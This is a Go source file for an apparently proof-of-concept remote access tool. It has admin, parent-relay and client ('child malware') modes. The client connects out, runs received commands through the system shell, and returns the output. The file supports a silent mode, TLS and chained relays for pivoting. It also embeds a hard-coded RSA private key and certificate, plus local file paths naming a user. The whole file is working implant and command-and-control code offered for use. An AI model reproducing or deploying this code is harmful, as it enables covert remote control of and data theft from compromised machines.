package main

import (
	"bufio"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	//"encoding/pem"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strings"
	"time"
)

// "/Blog/POC_Malwarez/arp_connect_main/ARP"

/* TO DO

[DONE] NO PRINTING TO SCREEN
CHECK IF CLIENT AND PARENT WORK ON LINUX

Add TLS within itself

error handling to identify if connection is dropped

might be worth making a function for sending and receiving?


// when launching parent mode, if admin is not ready it crashes

*/

var (
	// to handle errors throughout
	err error
	// COULD ADD IF MODE == USE LISTEN for admin and parent
	//IP & PORT for Admin to listen on
	serverlisten = flag.String("listen", "", "Where the client should connect, for use in Client modeconnection must be in form <ip>:<Port> eg: 127.0.0.1:9999")

	// IP and Port for client to connect
	clientConnect = flag.String("clientconnect", "", "Where the client should connect, for use in Client modeconnection must be in form <ip>:<Port> eg: 127.0.0.1:9999")

	// IP and Port for Parent to connect
	parentConnect = flag.String("parentconnect", "", "Where the parent should connect, for use in Client modeconnection must be in form <ip>:<Port> eg: 127.0.0.1:9999")
	//IP and Port for Parent to LISTEN on
	parentListen = flag.String("parentlisten", "", "What Port should the parent listen on, for use in Client modeconnection must be in form <port> eg: 10000")
	// To Skip PAUSES in tool
	skipEnter = flag.Bool("skip", false, "Will skip Enter requirement and run automatically, speeds testing")
	// TLS or NO TLS
	tlsOn = flag.Bool("tls", false, "Will add TLS to the network traffic")
	// Mode to be run in
	mode  = flag.String("mode", "", "mode {client|parent|clientlist|parentlist}")
	// quiet mode to silence prints --
	quiet = flag.Bool("silence", false, "To run in quiet mode, nothing will be printed to the screen")
	//admin logging
	loggingName = flag.String("log", "", "Log to a json file. eg \"-log logfile\" will log commands to logfile.json")
	// admin commands file
	commands = flag.String("commands", "", "Execute a list of commands from a file. Include file name eg: commands commands.txt")
	//domain X509 cert
	domaincert = `-----BEGIN CERTIFICATE-----
MIIESTCCAjGgAwIBAgIRAOcKE+Z7Su7SpKYr9fK4xCcwDQYJKoZIhvcNAQELBQAw
FTETMBEGA1UEAxMKTXkgUm9vdCBDQTAeFw0yMDA3MTAwMDI0MDBaFw0yMjAxMTAw
MDIwMzdaMBcxFTATBgNVBAMTDG15ZG9tYWluLmNvbTCCASIwDQYJKoZIhvcNAQEB
BQADggEPADCCAQoCggEBAN7gQnB+1Q7jykNEyVKtYYnkC0K4V0TerE1HHAn127UM
88Fz/rVVS0hKW/ARhOHyBE+H4pM8NGad8crEaA9P5FeTtTOK4wVdTOPu3CI5zEUB
tltx6dtsPOZIwBni3jW30u1GAYM/J2fZUEAv/p4T7Uo5KO3XZvH2oZ3BF5+NCDjp
w06NdCfzjuJCGFISkY7taG8XD3+DB9x38n+MpbA0fKYtm+2NvGC0X+KpPxANCjKW
ukEJdrXK1+rAUPe5Qpy8BbJwLRfDYGdpD5XwRIDORTSUHPyWtIjIjf4dMWio9FP/
EevapkKS3h0X77LScwfqXBtz1NHMNFu7MszPpZQ9ikMCAwEAAaOBkTCBjjAOBgNV
HQ8BAf8EBAMCA7gwHQYDVR0lBBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMB0GA1Ud
DgQWBBRGrCAke2xQu7mLor5ye/UIGlGsIjAfBgNVHSMEGDAWgBTI0F0PcJh79gkw
fIiUvkWp84tUGTAdBgNVHREEFjAUggxteWRvbWFpbi5jb22HBH8AAAEwDQYJKoZI
hvcNAQELBQADggIBAKK8hC2mQzjSnJmMtSBH+NrwKomt8GYZcdNwzOR/chWP44yb
9MuS2sOWyWa6tlW8rBotRBbKEguHwaLqZVcvpO3nLpzqdY8Ly3swSHg3fAaKW89A
E6MnZGJC56JjJVSYvAFZ9mQYTaulViYm0KmMySPRVLe4F4fKlfchBfhISydOBLz1
Af7rkTgnRdEaBWGQI+YuB5SYhF8mlDPLbKgxanX+T9AtJBsPtfK65N3uEyIeMVDb
H7IE6PHzE4DS9VsIhKrFKgbFmMLBtCgnycgMlnJ17X1Sn99jhwM3yeFMhCBrn6IJ
JhUxsFdhrujGXOh1W9hLR6iSRcFVL1rtsxx1v2A0TkyIZ4U6209Ndd2VEsdTfxf5
d21VU1yy9y0V2OwDWWwgaf7DHmww94G9MNt0M0TInqE2gA3WF2UcrL/rl1Xcog0R
f+cRX/Wlx3TshGCCxv6+OSf9EVlwB8UmvCjQCl0WFpIXzY4V59HaDiQruVwa7Znh
jiWkSB5nuFFzdpJQWLDOIdu5EBNCQbW/4lwLPBX06I91nMPJg/xzrsreMtX5h2L5
F9ujhyLZtjxcllRUtap7lX2NhQ4wE7dSUMeMcvBwLqW3NjPWce2xX9bjQb7mChYs
7jxk5rEVOEnQcEPggB7VyAYm8wKH5xCRIsabjIDLgSD2ZT36jhG76pnC8ryJ
-----END CERTIFICATE-----`

)
//Structure for sending list of commands and receiving output
type Results struct {
	CommandsList []string
	Command      string
	Output       string
	Time         string
}

// structure for writing to log file
type ResultsToFile struct {
	Time    string
	Command string
	Output  string
}
// Used to check if the log file exists or not
func checkFile(filename string) error {
	_, err := os.Stat(filename)
	if os.IsNotExist(err) {
		_, err := os.Create(filename)
		if err != nil {
			return err
		}
	}
	return nil
}

//func for logging to file
func logToFile(outputTest *Results) {

	var fileName string
	//TO DO: see if user added .json, do not double add .json
	fileName = *loggingName + ".json"

	//error is within the function
	_ = checkFile(fileName)

	//formatting data from Results structure into ResultstoFile
	outPutLog := &ResultsToFile{
		Output:  outputTest.Output,
		Time:    outputTest.Time,
		Command: outputTest.Command,
	}

	/* Reads the file, unmarshals to the resultsToFile struct
	then reads the current struct outPutLog and apppends it
	then marshes the json and writes it to the file

	this allows the function to be called multiple times to write
	the JSON to a file keeping it as multiple JSON objects
	*/

	file, _ := ioutil.ReadFile(fileName)
	data := []ResultsToFile{}
	json.Unmarshal(file, &data)
	data = append(data, *outPutLog)
	// err := c.(*tls.Conn.Handshake())
	dataBytes, err := json.Marshal(data)
	if err != nil {
		fmt.Println("Error in marshalling data")
	}
	//Writing to file
	if err := ioutil.WriteFile(fileName, dataBytes, 0644); err != nil {
		fmt.Println("unable to write to file")
	}

}

func adminlistMode(fileToRead string, conn net.Conn) {
// Function for Adminlist mode to read list of command from file
	// marshall and send to client or parent
	fmt.Println("Reading commands from: ", fileToRead)
	//Opening File
	file, err := os.Open(fileToRead)
	if err != nil {
		fmt.Println("Unable to open the file", err)
		log.Fatal(err.Error())
	}

	//Reading file in line by line
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var txtlines []string // array to hold each command
	// Appending each line in the file to the txtlines array
	for scanner.Scan() {
		txtlines = append(txtlines, scanner.Text())
	}

	fmt.Println("COMMANDS that will be run on the child malware:")
	//Printing commands to screen
	for _, value := range txtlines {
		fmt.Println(value)
	}

	// Creating structure object of array of commands to send to parent or client
	ListofCommands := &Results{

		CommandsList: txtlines,
	}

	//Attaching JSON encoder to CONN to send
	encoder := json.NewEncoder(conn)
	//Sending Structure with list of commands to client
	encoder.Encode(ListofCommands)

	//creating variable to place results into (Results struct)
	var outputResults Results
	// For each command in the array, we expect to receive a response
	// Loop through the length of the array and print output and Log
	for x := 0; x < len(ListofCommands.CommandsList); x++ {
		decoder := json.NewDecoder(conn)
		decoder.Decode(&outputResults)
		//Output to screen
		fmt.Println("===Results===")
		fmt.Println("Time of command execution: ", outputResults.Time)
		fmt.Println(outputResults.Output)
		//log to file if selected
		if *loggingName != "" {

			logToFile(&outputResults)
		}

	}
}
//high level function for error checking
func checkError(err error) {
	if err != nil {
		fmt.Println("Fatal error ", err.Error())
		os.Exit(1)
	}
}

func OSCheck() string {
	var OSShell string
	// execute commands on the correct OS
	if runtime.GOOS == "windows" {
		fmt.Println(quietCheck("OS identified as Windows"))
		//command =
		OSShell = "windows"
		// err := ni

	} else if runtime.GOOS == "linux" {
		fmt.Println(quietCheck("OS identified as: Linux"))
		OSShell = "linux"

	}
	return OSShell

}
// Time function for timestamp of command execution
func getTime() string { // func to get current time
	currentTime := time.Now()
	return currentTime.Format("2006-01-02 15:04:05")

}

func executeCommand(checkOS string, commandString string) *Results {

	var results string // holds results of command
	//execute based on correct OS
	if checkOS == "windows" { // cmd /C so that it terminates after every execution
		CommandExec, err := exec.Command("cmd", "/C", commandString).Output()
		if err != nil {
			if *quiet == false {
				fmt.Println("Error executing command", err)
			}
			CommandExec = []byte("Error executing command")
		}
		CommandExec2 := string(CommandExec)
		results = strings.TrimSpace(CommandExec2)

	} else if checkOS == "linux" {
		CommandExec, err := exec.Command(strings.TrimSpace(commandString)).Output()
		if err != nil {
			if *quiet == false {
				fmt.Println("Error executing command", err)
			}
			CommandExec = []byte("Error executing command")

		}
		CommandExec2 := string(CommandExec) // need for commands on linux - remove \r\n
		results = strings.TrimSpace(CommandExec2)
	}

	//getting current time so analysts can correlate with other tools

	currentTime := getTime()
	//using the Results structure
	outputTest := &Results{
		Output:  results,
		Time:    currentTime,
		Command: commandString,
	}

	return outputTest
}

func connectTLSadmin() net.Conn {
	// function for TLS on the admin portion
	var conn net.Conn
	var listen net.Listener

// KEY for TLS
mydomainkey := `-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA3uBCcH7VDuPKQ0TJUq1hieQLQrhXRN6sTUccCfXbtQzzwXP+
tVVLSEpb8BGE4fIET4fikzw0Zp3xysRoD0/kV5O1M4rjBV1M4+7cIjnMRQG2W3Hp
22w85kjAGeLeNbfS7UYBgz8nZ9lQQC/+nhPtSjko7ddm8fahncEXn40IOOnDTo10
J/OO4kIYUhKRju1obxcPf4MH3Hfyf4ylsDR8pi2b7Y28YLRf4qk/EA0KMpa6QQl2
tcrX6sBQ97lCnLwFsnAtF8NgZ2kPlfBEgM5FNJQc/Ja0iMiN/h0xaKj0U/8R69qm
QpLeHRfvstJzB+pcG3PU0cw0W7syzM+llD2KQwIDAQABAoIBAQCn78dgSNF1xMKV
aXFhcO98HW82uPxZEog2OoywHKeOhtHtRN/59ukg8ZbREAJW1ivVWYiqdMTvRbf5
l4DpeMOQEeaJje9+DU1wunz49SAsJxwnT3BtO+OvicXmO4JAa+DtlMBzCtVAdQj5
NLDgoBc+xE9I1/PkAnjJC8QnHvfBGUttjZN2Y7Vf6DDNt6FlJxe0zFX0jU4YIzHK
l/23peliVL3KU7wvYoilHkKxlbqNqbXIMJUqruyvwR9zY/atTkx7KeipoYLFd/bL
Dna9Ip9lhD5E0NQI2Qhlt6MfeM567l38Wg2PsJ/cAmjVLGDRgysR7EFR0evSMkZb
jkEQfRBhAoGBAO+GiSTaDqPeirKIU4axzjfzFE8+ZtxEu3xZxJfPo6pAU/N/dGqU
U3PSREUNH2Q6nPRJBSsEvTrAemmTOVbp2wR0c6Qf/LXQ+pvg7jOyUpJI7cokFzZ5
i0omJG+YJK/jTo+3MVn9DEyg839qPN2irenEqfrdiImwxL54e9d76aTpAoGBAO40
kPAn64NtpmkwdhYb8J8fnrRuF0XuQxeh85lMsnNnUmT4Jz3FitHVnNn+0gGQZYBT
k3Zhj2KM6qhslFshCRQwAhff3b5oDQgPRERxKax4hgx2EUZKejaBnX4FlMtfZsFV
agLdzT1tUyna126GnHvZ8E+PSFA/H4JpBN5+XCpLAoGBAIfKe8GapaYdKgBg7Ql1
j/WEJ0VtmR7TEH9E3QE7xAtnALEQ1sz9XfpRgEatU9icqhKLuxRSUX0XVc64mk89
sN7rrguj3r6sxQbOE/zW4ZzxH23z2/0UFvVofkuNs27LrOQo9R+RKAHhVWosrmjw
KyxWRA9mvFtjDYb2Ay98nk7RAoGAYjDK+iQKgg/GBCBU3QJBauZ23jtvXoU7pNc+
ehfSi52wqixcyKrQcXTThkzzNm/WV1KcO7U1jNM3u5uef/4bJvYvNrYyStXLYWIh
qvDW0+COqT5WGpqCzEsbp6IXVsoJqnJSE8JoYwTYvi0WltnoUWliFPmkPmf2ziQK
PMjrpwcCgYEAiuWfuBErQ6gQA8PUvATwmWa22dGowrsAYOFlLcXCHZJ1gKf9+2vJ
d48PAWMAVlB2KTAnnA7DwFnLALaAaAxHkTqWqlLo+Dtj/VHUqZ06b3Poe8nPjYf9
L+YfXkBaAnQvra+E6qXOX6u7F5JORGDaA6ENTbo7rBHFzlhU23j44uk=
-----END RSA PRIVATE KEY-----`


	if *tlsOn == true {
		fmt.Println("TLS enabled")

		cert, _ := tls.X509KeyPair([]byte(domaincert), []byte(mydomainkey))

		checkError(err)
		config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
		//  if err := c.(*tls.Conn.Handshake()); err != nil {
		listen, err = tls.Listen("tcp", *serverlisten, &config)
		if err != nil {
			fmt.Println("error with TLS")
			os.Exit(1)
		}

	} else {

		listen, err = net.Listen("tcp", *serverlisten)
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}

	}


	fmt.Println("===ADMIN SERVER LISTENING ===")
	fmt.Println("Admin interface will listen on: ", *serverlisten)
	fmt.Println("Connect the Child Malware to: ", *serverlisten)

	defer listen.Close()

	conn, _ = listen.Accept()
	if *tlsOn == true {
		if err := conn.(*tls.Conn).Handshake(); err != nil {

			log.Fatal(err.Error())
		}
	}
	// }
	fmt.Println("Connection made")

	return conn
}

func listMode(c net.Conn) {
// parent proxy liste mode
	if *quiet == false {

		fmt.Println(quietCheck("Running in Command List Mode"))
	}

	defer c.Close()

	fmt.Println(quietCheck("Reading Commands list"))


	// need to Decode
	var inputTest Results
	decoder := json.NewDecoder(c)
	decoder.Decode(&inputTest)
	checkOS := OSCheck()
	for _, value := range inputTest.CommandsList {
		fmt.Println(quietCheck(fmt.Sprintf("Command Received->: " + value)))
	// for each command in the list execute it and send back
		commandString := executeCommand(checkOS, value)

		encoder := json.NewEncoder(c)


		encoder.Encode(commandString)
		fmt.Println(quietCheck(fmt.Sprintf("Encoded format:", commandString)))
	}
}

func adminlistenMode(c net.Conn){
// normal admin mode
	for {
		// Read in data from CLI, send to listening client
		reader := bufio.NewReader(os.Stdin)
		fmt.Print(">> ")
		text, _ := reader.ReadString('\n')

		fmt.Fprintf(c, text+"\n")

		// if STOp is typed
		if strings.TrimSpace(string(text)) == "STOP" {
			fmt.Fprintf(c, text+"\n")
			fmt.Println("Closing TCP server!")

			return
		}
		/* receiving data
		creating a decode, attaching the connect c
		decoding into Results struct
		*/
		var outputTest Results
		decoder := json.NewDecoder(c)

		//catch if connect was closed
		if err := decoder.Decode(&outputTest); err != nil {
			log.Println(err.Error())
			fmt.Println("!!!! LOST CONNECTION RESTARTING !!!! ")
			// TODO FIX THIS RESTARTING LOOP
			adminlistenMode(connectTLSadmin())
			break // break out of loop and restart a connection and listen
		}
		fmt.Println("===Results===")

		fmt.Printf("Time of command execution: :%s\n", outputTest.Time)
		fmt.Println(outputTest.Output)

		//log commands at end of loop if selected
		if *loggingName != "" {
			logToFile(&outputTest)
		}
	}
}

func quietCheck(toPrint string) string {
	//function for printing nothing to screen if chosen
	// TODO - another idea is to have the print within this function so that a blank line isnt created
	checkQuiet := ""
	if *quiet == false {
		checkQuiet = toPrint
	}
	return checkQuiet
}
func connectTLS() net.Conn {

	var connattempt net.Conn
	//TLS : ON

	if *tlsOn == true {
		CA_Pool := x509.NewCertPool()

		severCert := []byte(domaincert)
		if err != nil {
			log.Fatal("Could not load server certificate!")
		}
		CA_Pool.AppendCertsFromPEM(severCert)

		config := tls.Config{RootCAs: CA_Pool}

		if *mode == "client" {

			connattempt, err = tls.Dial("tcp", *clientConnect, &config)
			if err != nil {
				fmt.Println(err)
				os.Exit(1)
			}
			fmt.Println(quietCheck("===Connection Successful=="))
		} else if *mode == "clientlist" {
			fmt.Println(quietCheck(fmt.Sprintf("Attempting to connect to %s with no TLS \n", *clientConnect)))
			connattempt, err = tls.Dial("tcp", *clientConnect, &config)
			// c, err := net.Dial("tcp", CONNECT)
			if err != nil {
				fmt.Println(err)
			}

			fmt.Println(quietCheck("===Connection Successful=="))
		} else if *mode == "parent" {
			fmt.Println(quietCheck(fmt.Sprintf("Attempting to connect to %s with TLS \n", *parentConnect)))
			connattempt, err = tls.Dial("tcp", *parentConnect, &config)
			// c, err := net.Dial("tcp", CONNECT)
			fmt.Println(quietCheck("===Connection Successful=="))
			if err != nil {
				fmt.Println(err)
			}
		} else if *mode == "parentlist" {
			fmt.Println(quietCheck(fmt.Sprintf("Attempting to connect to %s with TLS \n", *parentConnect)))
			connattempt, err = tls.Dial("tcp", *parentConnect, &config)
			// c, err := net.Dial("tcp", CONNECT)
			fmt.Println(quietCheck("===Connection Successful=="))
		} else if *mode == "admin" { }

	} else {
		// TLS: OFF
		if *mode == "client" {
			fmt.Println(quietCheck(fmt.Sprintf("Attempting to connect to %s with no TLS", *clientConnect)))
			// fmt.Printf("Attempting to connect to %s with no TLS \n", *clientConnect)
			connattempt, err = net.Dial("tcp", *clientConnect)
			if err != nil {
				fmt.Println(err)
				os.Exit(1)
			}
			fmt.Println(quietCheck("===Connection Successful=="))

		} else if *mode == "clientlist" {
			fmt.Println(quietCheck(fmt.Sprintf("Attempting to connect to %s with no TLS \n", *clientConnect)))
			connattempt, err = net.Dial("tcp", *clientConnect)
			if err != nil {
				fmt.Println(err)
				os.Exit(1)
			}
			fmt.Println(quietCheck("===Connection Successful=="))

		} else if *mode == "parent" {
			fmt.Println(quietCheck(fmt.Sprintf("Attempting to connect to %s with no TLS \n", *parentConnect)))
			connattempt, err = net.Dial("tcp", *parentConnect)
			if err != nil {
				fmt.Println(err)
				os.Exit(1)
			}
			fmt.Println(quietCheck("===Connection Successful=="))

		} else if *mode == "parentlist" {

			fmt.Println(quietCheck(fmt.Sprintf("Attempting to connect to %s with no TLS \n", *parentConnect)))
			connattempt, err = net.Dial("tcp", *parentConnect)
			if err != nil {
				fmt.Println(err)
				os.Exit(1)
			}

			fmt.Println(quietCheck("===Connection Successful=="))
		}

	}
	return connattempt
}

func clientMode(c net.Conn) {

	defer c.Close()

	fmt.Println(quietCheck("Listening for commands"))
	checkOS := OSCheck()
	for {

		// if c has no connect, break

		commandString := bufio.NewScanner(c)
		commandString.Scan()
		if err := commandString.Err(); err != nil {
			log.Println("ERROR: " + err.Error())
			os.Exit(1)
		}

		fmt.Println(quietCheck(fmt.Sprintf("Command Received->: " + commandString.Text())))
		value := string(commandString.Text())
		if strings.TrimSpace(value) == "STOP" {
			fmt.Println("TCP client exiting...")
			return
		}
		// fmt.Println("CMD received->: ", commandString.Text())

		commandresults := executeCommand(checkOS, value)

		encoder := json.NewEncoder(c)
		if err := encoder.Encode(commandresults); err != nil {
			log.Println("ERROR sending: " + err.Error())

			return
		}

		fmt.Println(quietCheck(fmt.Sprintf("Encoded format:", commandresults)))

	}
}

func pause(){
	if *quiet== false {
		if *skipEnter == false {
			reader := bufio.NewReader(os.Stdin)
			fmt.Println("<PRESS ENTER TO CONTINUE>")
			_, _ = reader.ReadString('\n')
		}
	}
	return
}


func parentListMode(c net.Conn) {
	defer c.Close()

	var listenChild net.Listener
	PORT := *parentListen

	if *tlsOn == true {
		cert, err := tls.LoadX509KeyPair("C:\\Users\\haydn\\Desktop\\hackers\\blackhatgo\\src\\RTV\\openssl\\mydomain.com.crt", "C:\\Users\\haydn\\Desktop\\hackers\\blackhatgo\\src\\RTV\\openssl\\mydomain.com.key")
		checkError(err)

		configServer := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}

		listenChild, err = tls.Listen("tcp", PORT, &configServer)
		if err != nil {
			fmt.Println("Error")
		}

	} else {
		listenChild, err = net.Listen("tcp", PORT)
		if err != nil {
			fmt.Println("Error:", err)

		}
	}

	defer listenChild.Close()
	if *quiet == false {
		fmt.Println("SERVER ESTABLISHED ON: " + PORT + " WAITING FOR CHILD TO CONNECT")
	}
	childconnect, err := listenChild.Accept()
	if err != nil {
		fmt.Println(err, "UNABLE TO CONNECT")
	} else if *quiet == false {
		fmt.Println("CHILD connected on", PORT)

	}

	//f if commands list is blank

	// need to Decode
	var inputTest Results
	decoder := json.NewDecoder(c)
	if err := decoder.Decode(&inputTest); err != nil {
		log.Println("ERROR Receiving Command List to foward to Client: " + err.Error())
		// os.exit()
		return
	}
	// sending to child
	encoder := json.NewEncoder(childconnect)
	// fmt.Printf("current time is :%s", currentTime.Format("2006-01-02 15:04:05"))

	encoder.Encode(inputTest)
	// decoder := json.NewDecoder(c)
	// decoder.Decode(&outputTest)

	//receiving
	var outputTest Results

	for x := 0; x < len(inputTest.CommandsList); x++ {
		//receiving and decoding from Child
		decoder := json.NewDecoder(childconnect)
		if err := decoder.Decode(&outputTest); err != nil {
			log.Println("ERROR Receiving Results from Child " + err.Error())
			// os.exit()
			return
		}
		//encoding and sending to Admin
		encoder := json.NewEncoder(c)

		if err := encoder.Encode(outputTest); err != nil {
			log.Println("ERROR Sending Results to Admin: " + err.Error())
			// os.exit()
			return
		}
	}

}

func parentMode(c net.Conn) {

	defer c.Close()
	var l2 net.Listener
	PORT := *parentListen

	if *tlsOn == true {
		cert, err := tls.LoadX509KeyPair("C:\\Users\\haydn\\Desktop\\hackers\\blackhatgo\\src\\RTV\\openssl\\mydomain.com.crt", "C:\\Users\\haydn\\Desktop\\hackers\\blackhatgo\\src\\RTV\\openssl\\mydomain.com.key")
		checkError(err)

		configServer := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}

		l2, err = tls.Listen("tcp", PORT, &configServer)
		if err != nil {
			fmt.Println("Unable to List on port: ", PORT)
			os.Exit(1)
		}

	} else {
		l2, err = net.Listen("tcp", PORT)
		if err != nil {
			fmt.Println("Unable to List on port: ", PORT)
			os.Exit(1)
		}
	}

	defer l2.Close()
	if *quiet == false {
		fmt.Println("SERVER ESTABLISHED ON: " + PORT + " WAITING FOR CHILD TO CONNECT")
	}
	c2, err := l2.Accept()
	if err != nil {
		fmt.Println(err, "UNABLE TO CONNECT")
		log.Fatal(err)
	} else {
		if *quiet == false {
			fmt.Println("CHILD connected on", PORT)
		}
	}
	//f if commands list is blank

	for {

		//var results string
		//Reading in ADMIN COMMAND
		commandString, err := bufio.NewReader(c).ReadString('\n')
		// commandString, err := ioutil.ReadAll(c)
		if err != nil {
			log.Println("ERROR: " + err.Error())
			os.Exit(1)
		}

		fmt.Print(quietCheck(fmt.Sprintf("COMMAND RECEIVED FROM ADMIN->: " + commandString)))

		if strings.TrimSpace(string(commandString)) == "STOP" {
			if *quiet == false {
				fmt.Println("TCP client exiting...")
			}
			break
		}

		text := commandString
		fmt.Fprintf(c2, text+"\n")

		// if strings.TrimSpace(string(text)) == "STOP" {
		// 	fmt.Println("Closing TCP server!")
		// 	return
		// }
		buf := make([]byte, 4096)
		// reading data from child
		len, err := c2.Read(buf)

		if err != nil {
			fmt.Println("Error reading:", err.Error())
			break
		}
		// writing to ADMIN server
		c.Write([]byte(buf[:len]))

		//end of main for loop
	}
}

func validateAddress(connect string, name string) {
	patternIP := "^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}:([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$"
	regexIP, _ := regexp.MatchString(patternIP, connect)
	if regexIP == false {

		fmt.Println("ERROR: NOT IN CORRECT IP FORMAT such as 192.168.0.1:1234")
		fmt.Println("Supplied: ", name, connect)
		os.Exit(1)
	}
	return
}

func main() {
	//parsing flags
	flag.Parse()

	if *mode == "" {
		flag.PrintDefaults()
		fmt.Println("error in flags")
		os.Exit(1)
	}

	fmt.Println(quietCheck(fmt.Sprintf("Attempting to use %s mode \n", *mode)))
	//Options to screen
	fmt.Println(quietCheck("==OPTIONS SELECTED=="))
	if *tlsOn == false {
		fmt.Println(quietCheck("TLS: OFF"))
	}else{
		fmt.Println(quietCheck("TLS: On"))
	}
	if *loggingName != "" {
		fmt.Println(quietCheck(fmt.Sprintf("Logging: ON - Filename: ", *loggingName + ".json")))
	} else {
		fmt.Println(quietCheck("Logging: OFF"))
	}
	if *skipEnter == false {
		fmt.Println(quietCheck("Skip PAUSE: OFF"))
	} else {
		fmt.Println(quietCheck("Skip PAUSE: ON"))
	}

	pause()



	if *mode == "client" {
		validateAddress(*clientConnect, *mode)
		clientMode(connectTLS())
	} else if *mode == "parent" {
		if *parentConnect == ""{
			fmt.Println("error in parentConnect Flag")
			os.Exit(1)
		}
		validateAddress(*parentConnect, "parentConnectFlag")
		validateAddress(*parentListen, *mode)
		parentMode(connectTLS())
	} else if *mode == "clientlist" {
		validateAddress(*clientConnect, *mode)
		listMode(connectTLS())
	} else if *mode == "parentlist" {
		validateAddress(*parentConnect, *mode)
		validateAddress(*parentListen, *mode)
		parentListMode(connectTLS())
	} else if *mode == "adminlist" {
		if *commands == "" {
			fmt.Println("Error with adminlist command")
			fmt.Println("Use Command -commands <filename> eg: -commands file.txt")
			os.Exit(1)

		}

		adminlistMode(*commands, connectTLSadmin())
	} else if *mode == "admin" {
		validateAddress(*serverlisten, *mode)
		adminlistenMode(connectTLSadmin())

	} 	else {
		fmt.Println("ERROR No correct modes Chosen")
		os.Exit(1)
	}

}
